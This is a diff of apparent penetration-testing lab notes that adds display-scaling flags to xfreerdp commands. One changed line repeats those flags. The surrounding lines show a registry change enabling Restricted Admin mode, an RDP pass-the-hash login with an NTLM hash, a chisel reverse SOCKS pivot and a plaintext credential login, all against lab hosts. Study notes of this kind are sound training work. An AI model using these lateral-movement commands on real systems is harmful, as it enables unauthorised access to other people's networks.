@@ -101,7 +101,7 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
 ```
 
 ```shell
-xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /scale-desktop:200 /scale:180 /scale-desktop:200 /scale:180
 ```
 
 ### #UAC Limits 
@@ -339,7 +339,7 @@ chisel server --port 8000 --socks5 --reverse
 Connect to foothold machine 
 ```shell
 
-xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
+xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution /scale-desktop:200 /scale:180
 ```
 Point proxy to it 
 ```cmd
